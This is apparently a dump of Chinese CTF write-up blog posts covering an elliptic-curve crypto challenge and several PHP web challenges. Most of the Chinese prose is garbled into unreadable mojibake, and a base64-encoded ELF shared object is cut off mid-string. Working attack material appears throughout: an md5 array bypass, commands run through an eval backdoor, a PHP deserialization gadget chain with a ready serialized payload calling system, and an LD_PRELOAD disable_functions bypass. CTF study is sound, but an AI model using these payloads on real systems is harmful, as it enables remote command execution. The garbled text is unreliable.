1b'*CTF{S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This}Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww' çœ‹è¿™ä¸ªflagå¥½åƒåˆæ˜¯æ­ªæ‰“æ­£ç€çš„ä¸€é¢˜â€¦.Pla1ä¼°è®¡æ˜¯æŸä¸ªæ–¹æ³•å§?ç­‰ä¸ªå®˜æ–¹wpå’¯è¿˜å¥½paddingé•¿åº¦ä¸å¤Ÿhhhh, ä¸è¿‡è¦æ˜¯é•¿åº¦å¤Ÿè·‘é‚£ä¸ªç»„åˆARTåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥å‡ºç»“æœçš„, å°±æ˜¯è¦å¤šæ‰“ä¸¤æŠŠæ¸¸æˆè€Œå·²é¡ºä¾¿ä¸€æ, è¿™ä¸ªpaddingæ˜¯æ­Œè¯å§! 500 mileså¥½å¬! MyCurveé™„ä»¶ 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import bytes_to_longfrom flag import flagassert flag[:5]=='*CTF{' and flag[-1]=='}'flag=flag[5:-1]def add(P,Q): if Q==0: return P x1,y1=P x2,y2=Q return (d1*(x1+x2)+d2*(x1+y1)*(x2+y2)+(x1+x1^2)*(x2*(y1+y2+1)+y1*y2))/(d1+(x1+x1^2)*(x2+y2)),(d1*(y1+y2)+d2*(x1+y1)*(x2+y2)+(y1+y1^2)*(y2*(x1+x2+1)+x1*x2))/(d1+(y1+y1^2)*(x2+y2))def mul(k,P): Q=(0,0) while k&gt;0: if is_even(k): k/=2 P=add(P,P) else: k-=1 Q=add(P,Q) return QF=GF(2**100)R.&lt;x,y&gt;=F[]d1=F.fetch_int(1)d2=F.fetch_int(1)x,y=(698546134536218110797266045394L, 1234575357354908313123830206394L)G=(F.fetch_int(x),F.fetch_int(y))P=mul(bytes_to_long(flag),G)print (G[0].integer_representation(),G[1].integer_representation())print (P[0].integer_representation(),P[1].integer_representation())#(698546134536218110797266045394L, 1234575357354908313123830206394L)#(403494114976379491717836688842L, 915160228101530700618267188624L) æ¤­åœ†æ›²çº¿â€¦ ç¬¬ä¸€æ¬¡åšè¿™æ ·çš„æ¯”èµ›çš„æ—¶å€™ä¹Ÿæ²¡åšå‡ºæ¥ æŸ¥äº†æŸ¥https://www.hyperelliptic.org (åº”è¯¥æ˜¯ä¸€ä¸ªæ›²çº¿åº“å‘ç°é‡Œé¢æœ‰ä¸€ç§æ›²çº¿å°±æ˜¯é¢˜ç›®ç»™çš„æ›²çº¿å°±æ˜¯è¿™ä¸ªå…·ä½“æ˜¯å•¥ç©æ„è¿˜æä¸æ‡‚ åªèƒ½å…ˆæŒ‰ç€åº“é‡Œé¢çš„æ•°æ®æŠŠè„šæœ¬å†™å¥½ å­¦å®ŒECCå†æ¥çœ‹çœ‹äº† 1234567891011121314from Crypto.Util.number import long_to_bytesF=GF(2**100)R.&lt;x,y&gt;=F[]def _map(p): x,y = F.fetch_int(p[0]),F.fetch_int(p[1]) u = 3*(x+y)/(x*y+x+y) v = 3*(x/(x*y+x+y)+2) return (u,v)G = (698546134536218110797266045394,1234575357354908313123830206394)P = (403494114976379491717836688842,915160228101530700618267188624)E = EllipticCurve(GF(2**100),[1, 2, 0, 0, 3])base = E(_map(G))res = E(_map(P))flag = discrete_log(res,base,base.order(),operation=&quot;+&quot;)print(long_to_bytes(flag))","link":"/2021/01/18/writeup-for-2020-starCTF/"},{"title":"writeup for 2020 æ–°ç”Ÿæ¯","text":"è¿™æ¬¡é¡¶ç€æ¡è€çˆ·çš„id(kirito zbds, æœ¬æ¥åªæ˜¯æƒ³ç€åšåšWebå’Œå°è¯•åšå®ŒCryptoçš„(ç»“æœæ²¡æœ‰åšå®Œ,æœ‰è¶£çš„åŠ å¯†æ˜¯çœŸçš„æœ‰è¶£, ç»“æœå‘ç°ä¸åšMiscåˆ†ä¸å¤ªå¤Ÿ, å°±è‚äº†å‡ é“, è¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿çš„. æ‰€ä»¥å…ˆæ¥ä¸ªç›®å½•å§(pwnçœŸçš„æ˜¯ä¸€é“éƒ½ä¸ä¼šå—¯â€¦: Web å‡çš„ç­¾åˆ° ä¸–ç•Œä¸Šæœ€ç®€å•çš„åé—¨ Letâ€™s play a simple game again lottery_revenge unserialize åˆä¸€ä¸ªåé—¨ babysql babyssrf OSINT checkin REVERSE æ‰è¿·è— basic_hash ByteCode Misc çœŸÂ·ç­¾åˆ° Look_at_your_keyboard Buddha Do you know Xp0int close_base PMGBA é›†é½äº”é¾™ç  Cyrpto ç¢°ç¢°è½¦ EasyRSA Go Home block cipher ant forest Webå‡çš„ç­¾åˆ°robots! robots! robots! robotsåè®®è¿™ä¸ªåè®®é‡Œé¢æ˜¯ç”¨æ¥è®¾å®šä¸€äº›ç½‘ç«™é‡Œä¸èƒ½è¢«æœç´¢å¼•æ“è·å–çš„å†…å®¹çš„(ä¸è¿‡CTFé‡Œå°±å˜æˆæç¤ºåšé¢˜äººæ–¹å‘çš„ä¸€ä¸ªæ–‡ä»¶äº†?ä¸€èˆ¬æ‹¿åˆ°webè¯´ä¸å®šrobots.txté‡Œé¢å°±æœ‰æç¤ºå‘¢ä¸è¿‡å¤§æ¦‚ç‡æ˜¯æ²¡æœ‰çš„ æ‰€ä»¥é©¬ä¸Šè¿›/robots.txtçœ‹çœ‹, é‡Œé¢æœ‰ä¸ªæç¤º:/phpp_tql.phpè®¿é—®/phpp_tql.phpæœ‰ä¸€æ®µæºç çœ‹äº†ä¸‹æ˜¯å…³äºmd5çš„æ¯”è¾ƒçš„,å› ä¸ºæ˜¯===, è‚¯å®šä¸ä¼šæ˜¯å¼±ç±»å‹äº†, æƒ³èµ·ä¹‹å‰å°±æŒ–è¿‡ä¸€ä¸ªå‘æŸç¯‡MD5çš„æ€»ç»“, æ‰€ä»¥å¾ˆå¿«å°±æƒ³åˆ°ç”¨æ•°ç»„æ¥åšäº†. å½“aå’Œbéƒ½æ˜¯æ•°ç»„çš„æ—¶å€™, md5(a) === md5(b) ä¼šåˆ¤æ–­ä¸ºçœŸ.åˆ©ç”¨è¿™ä¸ªå°±å¯ä»¥æ„é€ payload: ?phpp[]=1&amp;hphh[]=2 ä¸–ç•Œä¸Šæœ€ç®€å•çš„åé—¨å•Šè¿™, eval()çœŸçš„å¾ˆå®‰å…¨çš„.å…³äºç›´æ¥æŠŠç”¨æˆ·çš„è¾“å…¥ç›´æ¥æ”¾åœ¨eval()ä¸­å¯¼è‡´ç›®å½•éƒ½è¢«ç¿»äº†ä¸ªéè¿™æ¡£äº‹(ä¹Ÿæ²¡æƒ³å¤ªå¤š, æ‰‹åŠ¨ç¿»äº†ä¸€ä¸‹ç›®å½•(dalaoéƒ½æ˜¯ç›´æ¥æœç´¢flagçš„å¾€ä¸Šç¿»ä¸€ä¸ªç›®å½•system('ls /');å°±å‘ç°æœ‰flagäº†äºæ˜¯æå‡ºhackbar(POST) c=system('cat /flag'); Letâ€™s play a simple game againå¼€å¤´æ ¹æ®è¦æ±‚GETå’ŒPOSTä¼ å‚å°±è¡Œäº†.ä½†æ˜¯è¿™é‡Œå¥½åƒå‡ºäº†ä¸€ä¸ªå°é—®é¢˜. åšé¢˜çš„æ—¶å€™éƒ½æ˜¯æƒ³ç€æ€ä¹ˆåšå¿«å°±æ€ä¹ˆåš. äºæ˜¯ç»™ä¸»åŠæ–¹æäº¤wpçš„æ—¶å€™ä¼¼ä¹é—æ¼äº†ä»€ä¹ˆ(ä¸è¦æ‰“æˆ‘æˆ‘çœŸçš„æ˜¯åæ¥æ‰å‘ç°çš„â€¦ ä¸æ˜¯adminå°±è¿›ä¸å»å—! å…¶å®ç¬¬ä¸€æƒ³æ³•åº”è¯¥å°±æ˜¯X-Forwarded-Foræ”¹127.0.0.1çš„, ç„¶è€Œæˆ‘ç›´æ¥å»çœ‹Cookiesäº†, ä¹Ÿæ²¡æœ‰æ”¹XFF(X-Forwarded-For å‘ç°Cookies: YWRtaW49MA==, ä¸¤ä¸ªç­‰å·åæœ‰å…«ä¹æ˜¯base64äº†, æ‰”å»base64è§£ç å‡ºæ¥çš„æ˜¯admin=0, æƒ³ç€è®©Cookiesä¸ºadmin=1åº”è¯¥æ²¡é—®é¢˜äº†. æ‰€ä»¥å°†Cookiesæ”¹æˆYWRtaW49MQ==, å°±æ‹¿åˆ°Welcome admin! Here is your flag:ctf{Have_4_n1ce_c0mpetition!}äº†. ç„¶è€Œâ€¦äº‹æƒ…å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•, æ˜¨å¤©æŸå¾¡å‚å¤§ä½¬å‘äº†è‡ªå·±çš„wpä¹‹åæˆ‘å‘ç°, ä»€ä¹ˆ???X-Forwarded-Forè¦æ”¹127.0.0.1???, æˆ‘æ²¡æ”¹æ€ä¹ˆæ‹¿åˆ°flagäº†???äºæ˜¯çœ‹äº†çœ‹è‡ªå·±çš„firefoxæ’ä»¶â€¦å±®â€¦åŸæ¥æ˜¯ä¹‹å‰åšäº†é¢˜å°±æ²¡æœ‰å…³æ‰è¿™ä¸ª, å¯¼è‡´è‡ªå·±ä¸€ç›´éƒ½æ˜¯127.0.0.1â€¦æ‰€ä»¥ç›´æ¥å°±å‡ºflagäº†â€¦ä½†æ˜¯wpå·²ç»æäº¤äº†å•Š! ä¹Ÿæ²¡åŠæ³•æ”¹äº†, è¯´å®è¯æœ‰ç‚¹æ…Œâ€¦ lottery_revengeå»å¹´ä¹Ÿæœ‰æŠ½å¥–, ä¸€æ ·çš„é¡µé¢, ä¸ä¸€æ ·çš„å‘³é“â€¦(ä¼ªéšæœºæ•°çš„æ”»å‡»å±…ç„¶åœ¨webé‡Œé¢å‡ºç°äº†â€¦ å› ä¸ºå»å¹´åšè¿‡, æ‰€ä»¥ä¸Šæ¥ç›´æ¥å°±å¼€æŠ½äº†(burpsuiteæ°¸è¿œçš„ç¥, ä½†æ˜¯å‘ç°ä¸æ–­è®¿é—®data.phpéƒ½æ˜¯åŒä¸€ä¸ªå“åº”, æœ‰ç‚¹ä¸å¤ªå¯¹åŠ².æ‰€ä»¥çœ‹äº†çœ‹å“åº”å‘ç°äº†ä¸€æ®µæ³¨é‡Š å•Šâ€¦æŠ½å¥–å®ƒ, å®ƒå‡çº§äº†.è¦æ±‚$_POST['admin_key']==$_SESSION['key'] sessionå°±æ˜¯æ—¶é—´æˆ³å§. ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯å…ˆå–ç°åœ¨çš„æ—¶é—´æˆ³åŠ ä¸Šä¸€ä¸ªå¸¸æ•°ç„¶åä¸åœè®¿é—®. ä½†æ˜¯æ€æ ·éƒ½è®¿é—®ä¸æˆåŠŸ(äº‹å®ä¸Šå°±ç®—è®¿é—®æˆåŠŸäº†ä¹Ÿå°±æŠ½äº†ä¸€æ¬¡å¥–, ä¸‹ä¸€æ¬¡è¿˜å¾—é‡æ–°æ„é€ æ–°çš„æ—¶é—´æˆ³â€¦ å…¶å®è¿™é‡Œå¡äº†ä¸€æ®µæ—¶é—´(æˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±åˆ°åº•çˆ†ç ´äº†å¤šä¹…â€¦, å‘ç°æ€æ ·éƒ½ä¸è¡Œåå°±å»çœ‹äº†ä¸‹$_SESSIONå˜é‡æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç‰¹æ€§æˆ–è€…æ¼æ´. è¿˜çœŸå°±å‘ç°äº†ä¸€ä¸ªç‰¹æ€§:å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™,$_SESSIONçš„æ‰€æœ‰å˜é‡éƒ½æ˜¯ä¸ºç©ºçš„(å°±æ˜¯è¯´åˆå§‹åŒ–ä¸ºç©ºå˜›, å¯ä»¥çœ‹ä¸€ä¸‹æºç , ç»™$_SESSION['key']èµ‹å€¼æ˜¯åœ¨ä¸€æ¬¡è®¿é—®ä¹‹å, æ‰€ä»¥! åªéœ€è¦ä¸å¸¦Cookiesä»¥åŠå¸¦ä¸Šç©ºçš„admin_keyè®¿é—®data.phpå°±å¯ä»¥å¼€å§‹æŠ½å¥–å•¦.æŠ½å‡ºç»“æœè¿˜æ˜¯å¾ˆå¼€å¿ƒçš„, ä½†æ˜¯ç»“æœè¿˜éœ€è¦ä¸‹ä¸€æ­¥â€¦ ç¦»è°±, æŒ‰ç€æç¤ºè¿›å» ä¸€å¼€å§‹æ²¡æ‡‚è¿™ä¸ªé¡µé¢è¦æˆ‘å¹²å˜›, çœ‹çœ‹æ³¨é‡Šæœ‰æ²¡æœ‰æç¤º, å‘ç°ä¸‹é¢æœ‰ä¸ªsource=1dddd, ?source=1çœ‹æºç  å¤§æ¦‚æ˜¯è¯´éšæœºç”Ÿæˆ30ä¸ªæ•°, å¯¹åº”ä¸€ä¸ªè¡¨ä¸­çš„30ä¸ªå­—æ¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸², ç»™å‡ºå‰11ä½çŒœæ•´ä¸ªå­—ç¬¦ä¸². æ¯•ç«Ÿåšäº†æŒºå¤šä¼ªéšæœºæ•°çš„é¢˜äº†, çœ‹åˆ°mt_rand()å°±æƒ³èµ·ä¹‹å‰å·®ç‚¹æ²¡æŠŠæˆ‘æ•´åçš„MT-19937.(å½“ç§å­è®¾å®šæ¯æ¬¡éšæœºå‡ºæ¥çš„æ•°éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·æ˜¯ä¸æ˜¯å¾ˆç¥å¥‡å•Š! N1CTFé‚£é“ä¼ªéšæœºæ•°è¿˜å†å†åœ¨ç›®. æ‰€ä»¥è¯´, ç†è®ºä¸ŠçŸ¥é“éšæœºæ•°å‰é¢çš„å‡ ä½è¾“å‡ºæ˜¯å¯ä»¥é€†æ¨å›ç§å­çš„(æœ‰æ—¶å€™éœ€è¦è¶³å¤Ÿå¤šçš„è¾“å‡ºæ‰èƒ½å¾—åˆ°ç§å­, ä½†å…·ä½“é€†çš„ç®—æ³•è‚¯å®šä¸æ˜¯è¿™é¢˜çš„è€ƒç‚¹(è€ƒäº†æˆ‘ä¹Ÿé€†ä¸å‡ºæ¥, pythonè„šæœ¬å€’æ˜¯æœ‰ä¸€ä¸ªâ€¦ æ‰€ä»¥å»æœäº†ä¸€ä¸‹æœ‰æ²¡æœ‰æ”»å‡»mt_rand()çš„è„šæœ¬. çœŸå°±æœ‰ä¸€ä¸ªphp_mt_seed, githubä¸Šå°±æœ‰äº†. ä½†æ˜¯åšçš„æ—¶å€™è¿™é‡Œè¸©äº†ä¸€ä¸ªå¤§å‘, githubä¸Šé¢çš„æ˜¯ä½ç‰ˆæœ¬çš„è„šæœ¬, æ‰€ä»¥å¯¼è‡´è·‘äº†ä¸€ä¸‹åˆéƒ½æ²¡æœ‰è·‘å‡ºç»“æœæ¥. ç›´åˆ°æ™šä¸Šå‘ç°åˆ«äººçš„blogç”¨çš„æ˜æ˜¾ä¸æ˜¯ä¸€ä¸ªç‰ˆæœ¬çš„è„šæœ¬! æ‰å»æ‰¾äº†æ‰¾å‘ç°çœŸæœ‰ä»æœªä½“éªŒè¿‡çš„èˆ¹æ–°ç‰ˆæœ¬, é©¬ä¸Šæ‰”è¿›è™šæ‹Ÿæœºè·‘, ä¸åˆ°ä¸€åˆ†é’Ÿå°±å‡ºç»“æœäº†. æ‹¿ç€åˆšå‡ºæ¥çš„ç§å­ç”Ÿæˆå­—ç¬¦ä¸²æäº¤å°±è¡Œäº† unserializeä¸€ç›´è§‰å¾—ååºåˆ—åŒ–çœŸçš„å¾ˆæœ‰æ„æ€, å°±åƒæ¨ç†ä¸€æ ·ä¸€æ­¥ä¸€æ­¥çš„å¾€ä¸‹æ¨å‡ºpayloadæºç åœ¨è¿™ 12345678910111213141516171819202122232425262728293031323334&lt;?phphighlight_file(__FILE__);class A{ public $data; public function __destruct() { $this-&gt;data-&gt;close(); }}class B{ public $cache; public function getit($key){ if (isset($this-&gt;cache[$key])){ return $this-&gt;cache[$key]; } } public function __call($method, $args) { return call_user_func_array($this-&gt;getit($method), $args); }}class C{ public $evil,$arggg; public function evallll(){ call_user_func($this-&gt;evil,$this-&gt;arggg); }}unserialize($_GET['sssssss']); é¦–å…ˆcall_user_func()å¯ä»¥æ‰§è¡Œphpä¸­çš„å‡½æ•°, åŒ…æ‹¬system(), assert()è¿™äº›å±é™©çš„å‡½æ•° è€Œæºç é‡Œé¢åªæœ‰åœ¨ç±»Cä¸­çš„call_user_func()æ˜¯å¯ä»¥è‡ªå·±ç»™å®šæ‰§è¡Œçš„å‡½æ•°å’Œæ‰€ç”¨çš„å‚æ•°çš„, å˜é‡$evilå’Œå‡½æ•°evallll()ä¹Ÿæç¤ºäº†å±é™©å‡½æ•°å°±å‡ºç°åœ¨ç±»Cä¸­, æ‰€ä»¥ç°åœ¨çš„ç›®çš„å°±æ˜¯æƒ³åŠæ³•è°ƒç”¨ç±»Cä¸­çš„evallll() ååºåˆ—åŒ–çš„é¢˜åŸºæœ¬ç¦»ä¸å¼€é­”æ³•å‡½æ•°, æ‰¾äº†ä¸€ä¸‹, è¿™é‡Œçš„å‡ºç°äº†__destruct()å’Œ__call($method, $args). å¯¹äº__destruct(), å½“æŸä¸ªå¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™å¦‚æœå­˜åœ¨è¿™ä¸ªæ–¹æ³•å°±ä¼šè°ƒç”¨å®ƒ. ç¨‹åºç»“æŸè‚¯å®šä¼šé”€æ¯å‘€. è€Œå¯¹äº__call():å½“æŸä¸ªå¯¹è±¡çš„ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•è¢«è°ƒç”¨æ—¶, å¦‚æœ__callæ–¹æ³•å­˜åœ¨, åˆ™ä¼šè°ƒç”¨__callæ–¹æ³•, ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰€è°ƒç”¨çš„é‚£ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•å, ç¬¬äºŒä¸ªå‚æ•°æ˜¯è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶çš„å‚æ•°. å› ä¸ºAä¸­çš„__destruct()ä¼šè°ƒç”¨$data-&gt;close(), æ‰€ä»¥èƒ½é è¿™ä¸ªä»Aè¿›å…¥Bçš„__call. å†çœ‹çœ‹Bä¸­çš„call_user_func_array($this-&gt;getit($method), $args);å…¶å®å°±æ˜¯call_user_func_array($this-&gt;cache[$key], $args); åšåˆ°è¿™é‡Œæˆ‘å°±å¡ä½äº†, å› ä¸º$argså¹¶ä¸å¯æ§, æ‰€ä»¥ä¸€æ—¶åŠä¼šæƒ³ä¸åˆ°æ€æ ·é€šè¿‡Bä¸­çš„è¿™ä¸ªå‡½æ•°å»è¿›å…¥C. äºæ˜¯å†³å®šå»çœ‹çœ‹call_user_func_array();çš„æ‰‹å†Œ. è¿™æ‰çŸ¥é“åŸæ¥è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„,å…·ä½“æ˜¯è¿™æ ·:[å¯¹è±¡,å¯¹è±¡çš„æ–¹æ³•], è¿™æ ·å°±å¯ä»¥è°ƒç”¨Cä¸­çš„evallll()äº†! æ‰€ä»¥åªéœ€è¦æœ‰: 123456789class Cä¸­:$evil = 'system()';$arggg = cmd; # å…·ä½“å°±æ˜¯éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤class Bä¸­:$cache['close'] = [new C,'evallll']class Aä¸­:$data = new B è¿™æ ·å°±å¯ä»¥ä»»æ„æ‰§è¡Œå‘½ä»¤äº†. è‡³äºæ„é€ payload, åˆ©ç”¨phpå°±èƒ½æ„é€ äº†.é™„ä¸Šæ„é€ çš„ä»£ç : 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpclass A{ public $data; public function make($ob) { $this-&gt;data = $ob; }}class B{ public $cache; public function make($ob2) { $this-&gt;cache = $ob2; } public function getit($key) { if (isset($this-&gt;cache[$key])) { return $this-&gt;cache[$key]; } } public function __call($method, $args) { return call_user_func_array($this-&gt;getit($method), $args); }}class C{ public $evil = 'system'; public $arggg = 'cat /flag'; public function evallll() { call_user_func($this-&gt;evil, $this-&gt;arggg); }}$a = new A;$b = new B;$b-&gt;make(['close' =&gt; [new C, 'evallll']]);$a-&gt;make($b);var_dump(serialize($a)); å¾—åˆ°çš„payloadä¸º: 1?sssssss=O:1:&quot;A&quot;:1:{s:4:&quot;data&quot;;O:1:&quot;B&quot;:1:{s:5:&quot;cache&quot;;a:1:{s:5:&quot;close&quot;;a:2:{i:0;O:1:&quot;C&quot;:2:{s:4:&quot;evil&quot;;s:6:&quot;system&quot;;s:5:&quot;arggg&quot;;s:9:&quot;cat /flag&quot;;}i:1;s:7:&quot;evallll&quot;;}}}} åˆä¸€ä¸ªåé—¨è¿™é¢˜åšçš„æ—¶å€™å‘ç”Ÿäº†ä»¶å°è¶£äº‹(å½“ç„¶ä¸æ˜¯æŒ‡å‰äºŒè¡€çš„å¤§ä½¬åœ¨/tmpä¸‹é¢æäº‹æƒ…å•¦.ä¹Ÿä¸æ˜¯æŒ‡ä¸Šä¸€ä¸ªå¤§ä½¬åšå®Œäº†é¢˜è¿soæ–‡ä»¶éƒ½æ²¡æœ‰åˆ å•¦.æ›´ä¸æ˜¯æŒ‡è‡ªå·±åšå®Œäº†è¿˜å¿˜è®°æŠŠflagæ–‡ä»¶ç»™æ¸…ç†æ‰. çœ‹äº†ä¸‹phpinfo(), å‘ç°èƒ½æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°éƒ½è¢«banæ‰äº†. åˆ©ç”¨scandir()å‡½æ•°æœç´¢ç½‘ç«™ç›®å½•.å‘ç°æœ‰tmpæ–‡ä»¶å¤¹, å°è¯•ä¸Šä¼ æ–‡ä»¶å‘ç°å¯è¡Œ. æƒ³äº†æƒ³æ˜¯å¦å­˜åœ¨ç»•è¿‡disable_functionsçš„æ¼æ´å‘¢?ç¿»äº†ç¿»ç™¾åº¦, æ‰¾åˆ°ä¸€ä¸ªåœ¨Githubä¸Šçš„åˆ©ç”¨LD_PRELOADæ¼æ´ç»•è¿‡disable_functionsçš„é¡¹ç›®.é™„ä¸Šé“¾æ¥ å…·ä½“åŸç†æ˜¯åˆ©ç”¨LD_PRELOADçš„ç‰¹ç‚¹,å®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼Œå®ƒå…è®¸åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½ç”¨æˆ·å®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“, è¿™æ ·å°±å¯ä»¥è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“, è°ƒç”¨ä¸€äº›è¢«bançš„å‡½æ•°.(æœ‰ç†è§£çš„ä¸å¯¹çš„å¤§ä½¬è¯·åŠ¡å¿…å‘Šè¯‰æˆ‘!!! æ‰€ä»¥æ ¹æ®githubä¸Šé¢çš„README.MDä¸€æ­¥ä¸€æ­¥çš„åšå°±è¡Œäº† 1. å…ˆä¸Šä¼ ä¸€ä¸ªbypass_disablefunc_x64.soç”±äºsoæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶, æ‰€ä»¥ä¸Šä¼ çš„æ—¶å€™è€ƒè™‘å…ˆbase64ç¼–ç , ä¼ ä¸Šå»ç”¨phpè‡ªå¸¦çš„å‡½æ•°è§£ç ,ä¸‹é¢æ˜¯å½“æ—¶åšé¢˜çš„payload(å¯èƒ½ä¼šæœ‰ç‚¹é•¿hhh 1c=var_dump(scandir('/var/tmp'));$a='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